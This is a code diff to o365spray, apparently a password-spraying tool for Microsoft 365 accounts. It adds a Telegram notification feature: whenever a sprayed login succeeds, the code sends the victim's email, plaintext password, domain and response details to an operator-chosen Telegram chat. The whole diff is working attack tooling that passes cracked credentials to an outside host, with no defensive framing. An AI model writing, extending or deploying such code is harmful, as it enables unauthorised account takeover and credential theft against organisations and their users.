@@ -19,6 +19,7 @@ from o365spray.core.utils import (
     Defaults,
     DefaultFiles,
     Helper,
+    TelegramNotifier,
     ThreadWriter,
     text_colors,
     RequestLogger,
@@ -50,6 +51,8 @@ class SprayerBase(BaseHandler):
         proxy_url: str = None,
         request_retries: int = 1,
         request_retry_backoff: float = 0.5,
+        telegram_token: str = None,
+        telegram_chat_id: str = None,
         *args,
         **kwargs,
     ):
@@ -79,6 +82,8 @@ class SprayerBase(BaseHandler):
             proxy_url: fireprox api url
             request_retries: number of retries for transient request errors
             request_retry_backoff: initial backoff in seconds for retries
+            telegram_token: telegram bot token for spray notifications
+            telegram_chat_id: telegram chat id or @channel for spray notifications
 
         Raises:
             ValueError: if no output directory provided when output writing
@@ -112,6 +117,13 @@ class SprayerBase(BaseHandler):
         # Updated: configure retries for transient request failures.
         self.request_retries = max(0, int(request_retries))
         self.request_retry_backoff = float(request_retry_backoff)
+        # Updated: configure Telegram notifications for valid credentials.
+        self.telegram_notifier = TelegramNotifier(
+            token=telegram_token,
+            chat_id=telegram_chat_id,
+        )
+        self._notify_lock = threading.Lock()
+        self._notified_credentials = set()
 
         # Internal exit handler
         self.exit = False
@@ -198,6 +210,48 @@ class SprayerBase(BaseHandler):
         if meta:
             parts.append(" | ".join(meta))
         logging.info(" | ".join(parts))
+        if result == "VALID":
+            self._notify_valid_credential(
+                email=email,
+                password=password,
+                status=status,
+                reason=reason,
+                detail=detail,
+            )
+
+    def _notify_valid_credential(
+        self,
+        email: str,
+        password: str,
+        status: int = None,
+        reason: str = None,
+        detail: str = None,
+    ):
+        """Send a Telegram notification for a valid credential."""
+        if not self.telegram_notifier or not self.telegram_notifier.enabled:
+            return
+
+        cred_key = f"{email}:{password}"
+        with self._notify_lock:
+            if cred_key in self._notified_credentials:
+                return
+            self._notified_credentials.add(cred_key)
+
+        message_lines = [
+            "o365spray: VALID credential found",
+            f"Domain: {self.domain}",
+            f"Module: {self.module_tag}",
+            f"User: {email}",
+            f"Password: {password}",
+        ]
+        if status is not None:
+            message_lines.append(f"HTTP: {status}")
+        if reason:
+            message_lines.append(f"Reason: {reason}")
+        if detail:
+            message_lines.append(f"Detail: {detail}")
+
+        self.telegram_notifier.send_message("\n".join(message_lines))
 
     def shutdown(self, key: bool = False):
         """Custom method to handle exitting multi-threaded tasking.
